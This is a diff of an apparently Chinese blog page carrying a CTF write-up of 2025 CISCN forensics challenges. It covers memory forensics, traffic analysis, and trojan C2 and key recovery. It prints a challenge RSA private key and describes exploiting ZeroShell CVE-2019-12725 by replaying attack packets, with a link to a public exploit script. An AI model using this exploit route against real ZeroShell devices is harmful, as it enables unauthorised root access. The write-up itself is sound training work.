+<p>这里是用前面图片的密码解密私钥，但是这里其实没懂为什么是 rsa（</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">openssl rsa -in en.pem -out privkey.pem</code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
+MIICXAIBAAKBgQDBy6W&#x2F;kXdOZet6aQXxTvCeIaWnzc7uiHQinK02LAIvl5&#x2F;8dbAV
+GoiPIKtL8wX6MFEIWOGh&#x2F;MkuBBR3h7w8VrYM5R1gXNI2uTNkTs4c77+AzdLj1T1P
+JOD8yOUZ&#x2F;azztomzb8mQP8Ya+ZKguMmeRMPC+Yxqe0f&#x2F;T&#x2F;5b43bTUxqZAwIDAQAB
+AoGAU+075NC8mGkvJ54gArcrIXB0600IFullUjAEG3fHopDJqm3VSe5pwYJmbMfc
+iNMv5KuJW7u77H+71WAlNwReZkoMsC4cWuKHpQKZncvd125K0W7+TvljAKjawiVO
+EwKx2ChencaoYXO8PmC8RlR23z1Amaw3xZVwRtqzbKEqjjECQQDqjEugpJP9IwjL
+UVHA6kFilMO2TsUQtYtu1T+JKityX26JMMGTawsUl&#x2F;8&#x2F;3WGfUET1qbwu&#x2F;Mcj2yKr
+D2UII0CvAkEA04UsO8R97QTDHOP+ovUKM20H6dNWAE7tH3A&#x2F;efBVfcs&#x2F;MsVq&#x2F;jMx
+jig73U6rXeCP9qVWfe0AGCtEO9Q71Kt57QJAI1Sez8P6xtbQLFBDkFu5HbBrCrsy
+1CGEr11QBMllYgUeEWxWvG4TbTa4LFacrfLZcGfxAOLy3GPWBQ58mY014QJBALkS
+JpfM3tmJdyZKHrx6ZoiEd44RiYgPhs4hKokIzeSY9xz3OxxbsppNfcOvV6V2HMCT
+&#x2F;c+ElLaQ9Mzcb9UujCkCQB83SiCyM2R25J66gLo9OlJpu0hN4HKnQS&#x2F;59KSttLRQ
+5cRBOn3cdR&#x2F;q&#x2F;exxegBTmigbuOgvhZ8iiOwp&#x2F;pTiI2Q&#x3D;
+-----END RSA PRIVATE KEY-----</code></pre>
+
+<p>然后解密 flag，<del>不知道为什么最后死活解不出来</del></p>
+<p>解出来了，是用错 flag 数据了 orz</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112204038.png" alt="image"></p>
+<p>‍</p>
+<h3 id="sc05"><a href="#sc05" class="headerlink" title="sc05"></a>sc05</h3><blockquote>
+<p>近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。</p>
+</blockquote>
+<blockquote>
+<p>问题1：IP1地址首次被请求时间是多久？计算内容如：2020&#x2F;05&#x2F;18_19:35:10 提交格式：flag{32位大写MD5值}</p>
+</blockquote>
+<p>在 http 表中找到了一个访问的时间</p>
+<p><code>2024/11/09 16:23:57</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112210354.png" alt="image"></p>
+<p>然后在 tcp 表中还有 4 个，最早的应该就是这个</p>
+<p><code>2024/11/09 16:22:42</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112210527.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>问题2：IP1地址对应的小马程序MD5是多少？提交格式：flag{32位大写MD5值}</p>
+</blockquote>
 <p>‍</p>
 <p>‍</p>
 <p>‍</p>
+<blockquote>
+<p>问题3：大马程序运行在哪个进程中？计算内容：PID-进程名，如123-cmd.exe 提交格式：flag{32位大写MD5值}</p>
+</blockquote>
+<p>通过命令 列出可能包含注入代码的进程内存范围</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">volatility3&#x2F;vol.py -f question&#x2F;Windows\ 10\ x64-Snapshot13.vmem windows.malfind</code></pre>
+
+<p>这里找到的这个就是，但是这里有 4 个结果，一个个试应该也行（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113155055.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>问题4：大马程序备用回连的域名是多少？计算内容如：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 提交格式：flag{32位大写MD5值}</p>
+</blockquote>
+<p>‍</p>
+<blockquote>
+<p>问题5：攻击者最终窃取数据的文件中包含的flag值？ 提交格式：flag{xxx},注意大小FLAG{xx}要转换为小写flag{xx}</p>
+</blockquote>
+<p>‍</p>
+<h3 id="zeroshell"><a href="#zeroshell" class="headerlink" title="zeroshell"></a>zeroshell</h3><blockquote>
+<p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取 root 权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写 exp 或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p>
+</blockquote>
+<blockquote>
+<p>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的 flag, 结果提交形式：flag{xxxxxxxxx}</p>
+</blockquote>
+<p>在 243 流找到了这个攻击会话，然后看到在 <code>Referer</code>​ 有一个熟悉的 <code>Zmxh</code></p>
+<p><code>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113154028.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}</p>
+</blockquote>
+<p>按照他流量包请求的方式发包</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113160859.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113160909.png" alt="image"></p>
+<p><code>c6045425-6e6e-41d0-be09-95682a4f65c4</code></p>
+<p>最后在 database 中找到了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113161906.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{<a target="_blank" rel="noopener" href="http://www.abc.com/">www.abc.com</a>} 或 flag{16.122.33.44}</p>
+</blockquote>
+<p>这里可以找到一个脚本直接连上去</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gougou123-hash/CVE-2019-12725">gougou123-hash&#x2F;CVE-2019-12725: ZeroShell命令执行漏洞批量扫描poc+exp</a></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113164517.png" alt="image"></p>
+<p>直接 <code>netstat</code>​ 就能发现一个奇怪的 IP <code>202.115.89.103</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113164728.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>4.请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径</p>
+</blockquote>
+<p>这个本来想找网络连接对应的程序的，但是没有找到，这里在原本找到 flag 的地方看到一个 <code>.nginx</code> 文件，而且很大</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113170448.png" alt="image"></p>
+<p>这个还是一个 elf 文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113170646.png" alt="image"></p>
+<p>rstudio 中下载下来，然后丢到沙箱中</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113170628.png" alt="image"></p>
+<p>可以发现外联 IP 是一样的，那就是这个文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113170913.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag{xxxx}</p>
+</blockquote>
+<p>这题跟着 ai 一步步分析，先在 main 函数中跟进 <code>sub_804D9A4</code> ，会发现这个是加密主逻辑</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113171502.png" alt="image"></p>
+<p>然后在这里 ai 能找到这个 <code>off_81130C0</code> 是会发送过去的</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113171542.png" alt="image"></p>
+<p>跟进就能发现这个就像密钥 <code>11223344qweasdzxc</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113171616.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}</p>
+</blockquote>
+<p>将这个文件夹中的内容都导出来，然后用 vsc 全局查找</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113172538.png" alt="image"></p>
+<p>答案就是这个了<br>​<code>\var\register\system\startup\scripts\nat\File</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113172602.png" alt="image"></p>
+<p>‍</p>
+<h3 id="WinFT"><a href="#WinFT" class="headerlink" title="WinFT"></a>WinFT</h3><blockquote>
+<p>某单位网管日常巡检中发现某员工电脑（IP：192.168.116.123）存在异常外连及数据传输行为，随后立即对该电脑进行断网处理，并启动网络安全应急预案进行排查。</p>
+</blockquote>
+<blockquote>
+<p>1、受控机木马的回连域名及ip及端口是（示例：flag{xxx.com:127.0.0.1:2333}）</p>
+</blockquote>
+<p>打开 currports，就能发现一个很奇怪的进程，找到这个文件拖出来</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113210528.png" alt="image"></p>
+<p>沙箱分析，结合这个工具，答案就是</p>
+<p><code>miscsecure.com:192.168.116.130:443</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113210751.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>2、受控机启动项中隐藏flag是</p>
+</blockquote>
+<p>用桌面的 pchunter 就能看到 flag</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113205828.png" alt="image"></p>
+<p><code>{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113210158.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>3、受控机中驻留的flag是</p>
+</blockquote>
+<p>比较神奇，在 everything 中搜索上一题的名字，就可以找到这个文件，是一个 7z 文件，有密码，密码就是那个恶意程序的名字 <code>flvupdate</code></p>
+<p>‍</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113211504.png" alt="image"></p>
+<p><code>flag{Timeline_correlation_is_a_very_important_part_of_the_digital_forensics_process}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113211658.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>4、受控源头隐藏的flag是</p>
+</blockquote>
+<p>桌面有一个 Thunderbird ，我记得那时候也排查了好久的邮件，这里应该先关注有附件的文件，这里看到这个有附件但是没有显示出来，查看这个附件，解压出来的文件丢到沙箱</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212258.png" alt="image"></p>
+<p>发现这个就是下载木马的元凶，那就重点关注这个发信人</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212415.png" alt="image"></p>
+<p>将他另一个发的邮件下载下来</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212725.png" alt="image"></p>
+<p>查看源码</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212742.png" alt="image"></p>
+<p>这个 key 提出来</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212804.png" alt="image"></p>
+<p>得到 flag</p>
+<p><code>{The Journey to the West}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113212821.png" alt="image"></p>
 <p>‍</p>
 <p>‍</p>
+<blockquote>
+<p>5、分析流量，获得压缩包中得到答案</p>
+</blockquote>
+<p>在流量中找到一个压缩包，最后的后面一串东西，base64 后用 utf-8 可以看到一个hint</p>
+<p>提一嘴，这个 zip 拉出来会显示有问题，但是 winrar 就能修复</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113175131.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113174907.png" alt="image"></p>
+<p>结果这个就是密码（</p>
+<p><code>flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113175038.png" alt="image"></p>
 <p>‍</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3311">flask之ssti模版注入从零到入门-先知社区</a></p>
+<blockquote>
+<p>6、通过aes解密得到的flag</p>
+</blockquote>
+<p>这里看 wp 也没懂是怎么找到的（</p>
+<p>先筛选回连 ip <code>ip.addr == 192.168.116.130</code></p>
+<p>不知道是怎么锁定这个就是密文的（</p>
+<p>然后工具上一题的答案，<br>key 是 <code>a1b2c3d4e5f67890abcdef1234567890</code>​<br>iv 是 <code>2f4d90a1b7c8e2349d3f56e0a9b01b8a</code>​<br>模式是 <code>CBC</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113213507.png" alt="image"></p>
+<p><code>flag{Hey, keep going and look for another flag}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251113213629.png" alt="image"></p>
 <p>‍</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/smileleooo/p/18612261#zeroshell_6">2024-CISCN-长城杯-威胁检测与网络流量分析-zeroshell-WP - smileleooo - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://bili33.top/posts/CTF-CISCN2025-Preliminary-round-Writeup/#Forensic-zeroshell-3-Luminoria">【Volcania】2025 CISCN x 长城杯铁人三项 初赛Writeup | GamerNoTitle</a></p>
 
                 
             </div>
@@ -546,7 +788,7 @@ print(t)</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Marinff.github.io/2025/11/28/ssti/">http://Marinff.github.io/2025/11/28/ssti/</a>
+                    <a href="http://Marinff.github.io/2025/11/28/2025-ciscn/">http://Marinff.github.io/2025/11/28/2025-ciscn/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -584,8 +826,12 @@ print(t)</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">基础漏洞</span>
+                                <a href="/tags/misc/">
+                                    <span class="chip bg-color">misc</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
                                 </a>
                             
                         </div>
@@ -664,9 +910,10 @@ print(t)</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/11/28/2025-ciscn/">
                     <div class="card-image">
@@ -683,9 +930,9 @@ print(t)</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-11-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-11-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -698,6 +945,7 @@ print(t)</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -720,12 +968,12 @@ print(t)</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/11/28/xxe/">
+                <a href="/2025/11/28/ssti/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_123907.jpg" class="responsive-img" alt="XXE">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/15212263_95842155_p0.jpg" class="responsive-img" alt="SSTI">
                         
-                        <span class="card-title">XXE</span>
+                        <span class="card-title">SSTI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
